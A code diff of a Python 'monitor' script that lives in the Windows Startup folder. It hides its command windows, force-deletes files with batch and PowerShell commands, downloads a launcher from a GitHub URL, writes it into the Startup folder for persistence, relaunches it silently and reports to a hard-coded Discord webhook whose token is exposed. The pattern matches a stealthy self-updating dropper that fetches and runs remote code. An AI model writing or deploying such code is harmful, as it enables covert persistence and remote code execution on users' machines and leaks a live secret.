@@ -1,35 +1,75 @@
-# monitor_script.py - Only does cleanup and launcher update
+# monitor_script.py - Force deletion with multiple methods
 import os
 import sys
-import urllib.request
 import subprocess
 import tempfile
 import time
 import requests
+import shutil
 
-# Discord webhook for update notifications
-UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
+# Discord webhook
+WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
 
 def send_webhook(message):
     """Send simple webhook"""
     try:
         data = {"content": message}
-        requests.post(UPDATE_WEBHOOK, json=data, timeout=5)
+        requests.post(WEBHOOK, json=data, timeout=5)
     except:
         pass
 
-def nuclear_cleanup():
-    """Force delete ALL files from startup folder"""
-    startup_folder = os.path.join(
+def delete_locked_files():
+    """Multiple methods to delete locked files"""
+    startup = os.path.join(
         os.getenv('APPDATA'),
         'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
     )
     
-    # Batch script to force delete everything
-    batch_script = f'''@echo off
-cd /d "{startup_folder}"
+    # List of files to delete (specific targets)
+    files_to_delete = [
+        "Startup.pyw",  # The current launcher
+        "startup_log.txt",
+        "monitor_script.py",
+        "monitor.py",
+        "update_cache.json",
+        "requirements.txt",
+        "github_launcher.pyw",
+        "clean_launcher.pyw"
+    ]
+    
+    # Also delete any .log, .txt, .json, .py files
+    patterns = ['.log', '.txt', '.json', '.py', '.pyw', '.pyc', '.bat']
+    
+    print("Starting forced deletion...")
+    
+    # Method 1: Use Windows move command (can move locked files)
+    batch1 = f'''@echo off
+cd /d "{startup}"
 
-:: Delete all unwanted files
+echo [1/3] Moving locked files to temp...
+move "Startup.pyw" "%TEMP%\\Startup_old.pyw" 2>nul
+move "startup_log.txt" "%TEMP%\\startup_log_old.txt" 2>nul
+move "monitor_script.py" "%TEMP%\\monitor_old.py" 2>nul
+
+:: Delete from temp
+del /f /q "%TEMP%\\Startup_old.pyw" 2>nul
+del /f /q "%TEMP%\\startup_log_old.txt" 2>nul
+del /f /q "%TEMP%\\monitor_old.py" 2>nul
+
+echo Files moved and deleted from temp
+'''
+    
+    # Method 2: Force delete with retries
+    batch2 = f'''@echo off
+cd /d "{startup}"
+
+echo [2/3] Force deleting remaining files...
+
+:: Delete specific files with multiple attempts
+:retry_delete
+del /f /q startup_log.txt 2>nul
+del /f /q Startup.pyw 2>nul
+del /f /q monitor_script.py 2>nul
 del /f /q *.log 2>nul
 del /f /q *.txt 2>nul
 del /f /q *.json 2>nul
@@ -37,11 +77,16 @@ del /f /q *.py 2>nul
 del /f /q *.pyw 2>nul
 del /f /q *.pyc 2>nul
 del /f /q *.bat 2>nul
-del /f /q requirements.txt 2>nul
 
-:: Keep only launchers (will be updated)
-if exist "github_launcher.pyw" (
-    copy "github_launcher.pyw" "Startup.pyw" /Y >nul
+:: Check if files still exist
+if exist startup_log.txt (
+    timeout /t 1 /nobreak >nul
+    goto retry_delete
+)
+
+if exist Startup.pyw (
+    timeout /t 1 /nobreak >nul
+    goto retry_delete
 )
 
 :: Delete __pycache__ folders
@@ -49,86 +94,100 @@ for /d %%d in (__pycache__) do (
     rmdir /s /q "%%d" 2>nul
 )
 
-echo Cleanup complete
-timeout /t 2 /nobreak >nul
-del "%~f0" >nul 2>nul
+echo Force deletion complete
 '''
     
-    # Save and run batch file
-    batch_path = tempfile.gettempdir() + "/nuke_startup.bat"
-    with open(batch_path, 'w') as f:
-        f.write(batch_script)
+    # Method 3: Use PowerShell to delete (most powerful)
+    batch3 = f'''@echo off
+cd /d "{startup}"
+
+echo [3/3] PowerShell force delete...
+
+powershell -Command "Get-ChildItem -Path '{startup}' -Include *.log,*.txt,*.json,*.py,*.pyw,*.pyc,*.bat -File -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue"
+powershell -Command "Get-ChildItem -Path '{startup}' -Directory -Filter '__pycache__' -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue"
+
+echo Cleanup complete!
+'''
     
-    # Run hidden
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    
-    subprocess.Popen(
-        ['cmd', '/c', batch_path],
-        startupinfo=startupinfo,
-        creationflags=subprocess.CREATE_NO_WINDOW
-    )
-    
-    # Wait a bit
-    time.sleep(3)
+    # Execute all methods
+    for i, batch_script in enumerate([batch1, batch2, batch3]):
+        batch_path = tempfile.gettempdir() + f"/delete_method{i}.bat"
+        with open(batch_path, 'w') as f:
+            f.write(batch_script)
+        
+        # Run hidden with wait
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        
+        process = subprocess.run(
+            ['cmd', '/c', batch_path],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            timeout=10
+        )
+        
+        # Clean up batch file
+        time.sleep(1)
+        try:
+            os.remove(batch_path)
+        except:
+            pass
+        
+        time.sleep(2)  # Wait between methods
     
     return True
 
-def update_launcher():
-    """Download github_launcher.pyw from GitHub and replace Startup.pyw"""
+def download_new_launcher():
+    """Download the new github_launcher.pyw"""
     try:
         launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
-        
-        # Download new launcher
-        response = urllib.request.urlopen(launcher_url, timeout=10)
-        new_launcher_code = response.read().decode('utf-8')
-        
-        # Save to startup folder
-        startup_folder = os.path.join(
+        startup = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         )
         
-        # Write as Startup.pyw
-        with open(os.path.join(startup_folder, "Startup.pyw"), 'w', encoding='utf-8') as f:
-            f.write(new_launcher_code)
+        # Download new launcher
+        import urllib.request
+        new_code = urllib.request.urlopen(launcher_url).read().decode('utf-8')
         
-        # Also save as github_launcher.pyw (backup)
-        with open(os.path.join(startup_folder, "github_launcher.pyw"), 'w', encoding='utf-8') as f:
-            f.write(new_launcher_code)
+        # Write to startup folder
+        launcher_path = os.path.join(startup, "Startup.pyw")
+        with open(launcher_path, 'w', encoding='utf-8') as f:
+            f.write(new_code)
         
-        send_webhook("✅ Launcher updated successfully!")
+        # Also copy as github_launcher.pyw
+        backup_path = os.path.join(startup, "github_launcher.pyw")
+        with open(backup_path, 'w', encoding='utf-8') as f:
+            f.write(new_code)
+        
+        print("✓ New launcher installed")
         return True
         
     except Exception as e:
-        send_webhook(f"❌ Failed to update launcher: {str(e)}")
+        print(f"✗ Failed to download launcher: {e}")
         return False
 
-def delete_self():
-    """Delete this monitor_script.py file"""
+def schedule_restart():
+    """Schedule a restart of the new launcher"""
     try:
-        this_script = os.path.abspath(__file__)
-        
-        # Check if we're in startup folder
-        startup_folder = os.path.join(
+        startup = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         )
         
-        if this_script.startswith(startup_folder):
-            # Create batch file to delete this script
-            batch_content = f'''@echo off
+        launcher_path = os.path.join(startup, "Startup.pyw")
+        
+        if os.path.exists(launcher_path):
+            # Create batch file to restart launcher
+            batch = f'''@echo off
 timeout /t 5 /nobreak >nul
-del /f /q "{this_script}" >nul 2>nul
-if exist "{this_script}" (
-    del /f /q "{this_script}" >nul 2>nul
-)
-del "%~f0" >nul 2>nul
+start /b "" "{sys.executable}" "{launcher_path}"
+del "%~f0"
 '''
             
-            batch_path = tempfile.gettempdir() + "/delete_monitor.bat"
+            batch_path = tempfile.gettempdir() + "/restart_launcher.bat"
             with open(batch_path, 'w') as f:
-                f.write(batch_content)
+                f.write(batch)
             
             # Run hidden
             startupinfo = subprocess.STARTUPINFO()
@@ -140,37 +199,44 @@ del "%~f0" >nul 2>nul
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
             
+            return True
+            
     except:
         pass
+    
+    return False
 
 def main():
     """Main cleanup and update function"""
-    print("=" * 50)
-    print("STARTUP FOLDER CLEANER & LAUNCHER UPDATER")
-    print("=" * 50)
+    print("=" * 60)
+    print("FORCE DELETE & LAUNCHER UPDATE")
+    print("=" * 60)
     
-    # 1. Nuclear cleanup
-    print("\n[1/3] Force cleaning startup folder...")
-    nuclear_cleanup()
+    # Step 1: Force delete all files
+    print("\n[1/3] Force deleting all files from startup folder...")
+    delete_locked_files()
     
-    # 2. Update launcher
-    print("\n[2/3] Updating launcher from GitHub...")
-    update_launcher()
+    # Step 2: Download new launcher
+    print("\n[2/3] Downloading new launcher from GitHub...")
+    download_new_launcher()
     
-    # 3. Delete this script
-    print("\n[3/3] Removing cleanup script...")
-    delete_self()
+    # Step 3: Schedule restart of new launcher
+    print("\n[3/3] Scheduling restart...")
+    schedule_restart()
     
-    print("\n" + "=" * 50)
-    print("CLEANUP COMPLETE!")
-    print("Next boot will use new launcher")
-    print("=" * 50)
+    # Send webhook
+    print("\n[+] Sending webhook...")
+    send_webhook("✅ FORCE CLEANUP COMPLETE: All files deleted, new launcher installed!")
     
-    # Send final webhook
-    send_webhook("🔄 Startup folder cleaned and launcher updated successfully!")
+    print("\n" + "=" * 60)
+    print("CLEANUP SUCCESSFUL!")
+    print("✓ All files deleted from startup folder")
+    print("✓ New launcher installed (github_launcher.pyw)")
+    print("✓ Launcher will restart in 5 seconds")
+    print("=" * 60)
     
-    # Wait before exit
-    time.sleep(2)
+    # This script will exit, and the new launcher will start
+    time.sleep(3)
 
 if __name__ == "__main__":
     main()
